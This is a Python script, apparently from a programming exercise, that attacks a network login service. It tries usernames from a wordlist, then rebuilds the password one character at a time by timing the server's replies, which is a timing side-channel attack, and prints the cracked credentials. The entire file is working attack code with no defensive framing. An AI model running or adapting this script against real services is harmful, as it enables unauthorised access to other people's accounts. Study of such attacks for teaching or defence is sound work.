import sys
import socket
import itertools
import json
import string
from time import perf_counter


PATH_LOGINS = '../data/logins.txt'
ABC = string.ascii_letters + string.digits
MAX_LENGTH = 10
RESULT_BAD = 'Bad request!'
RESULT_W_LOGIN = 'Wrong login!'
RESULT_W_PASS = 'Wrong password!'
RESULT_EXCEPT = 'Exception happened during login'
RESULT_SUCCESS = 'Connection success!'
DELAY = 0.1


def try_to_login(sock: socket.socket, login: str, password: str = 'pass') -> str:
    sock.send(json.dumps({'login': login, 'password': password}).encode())
    return json.loads(sock.recv(1024).decode())['result']


def main():
    args = sys.argv
    hostname: str = args[1]
    port: int = int(args[2])
    with open(PATH_LOGINS, 'r') as file:
        logins = file.read().strip().split('\n')
    with socket.socket() as sock:
        sock.connect((hostname, port))
        # pick login
        for login in logins:
            result = try_to_login(sock, login)
            if result == RESULT_BAD:
                raise ConnectionError(RESULT_BAD)
            if result != RESULT_W_LOGIN:
                break
        else:
            raise ValueError(RESULT_W_LOGIN)
        # pick password letter by letter
        password = ''
        for _ in range(MAX_LENGTH):
            itr = itertools.product([password], ABC)
            for tup in itr:
                password = ''.join(tup)
                start = perf_counter()
                result = try_to_login(sock, login, password)
                duration = perf_counter() - start
                if result == RESULT_BAD:
                    raise ConnectionError(RESULT_BAD)
                if result == RESULT_SUCCESS:
                    print(json.dumps({'login': login, 'password': password}))
                    return
                if duration >= DELAY:
                    break
            else:
                raise ValueError(RESULT_EXCEPT)
        else:
            raise ValueError(RESULT_W_PASS)


if __name__ == "__main__":
    main()
